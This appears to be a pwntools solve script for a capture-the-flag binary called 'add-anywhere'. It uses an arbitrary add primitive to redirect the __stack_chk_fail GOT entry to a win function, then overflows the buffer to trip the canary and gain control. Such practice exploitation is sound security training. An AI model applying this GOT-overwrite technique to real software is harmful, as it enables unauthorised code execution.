#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./add-anywhere"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("add-anywhere.cpctf.space", 30014)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *main+248
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

stack_chk_fail_got_addr = elf.got['__stack_chk_fail']
log.info("stack_chk_fail@got: " + hex(stack_chk_fail_got_addr))
stack_chk_fail_got_ptr = elf.plt['__stack_chk_fail'] - 0x64
log.info("stack_chk_fail@got -> " + hex(stack_chk_fail_got_ptr))
win_addr = elf.symbols['win']
log.info("win func: " + hex(win_addr))
offset =  win_addr - stack_chk_fail_got_ptr
log.info("offset: " + hex(offset))

p.recvuntil("addr>")
p.sendline(str(hex(stack_chk_fail_got_addr)))
p.recvuntil("val>")
p.sendline(str(offset))
p.recvuntil("Any comment?")
p.sendline("A" * 26)

p.interactive()
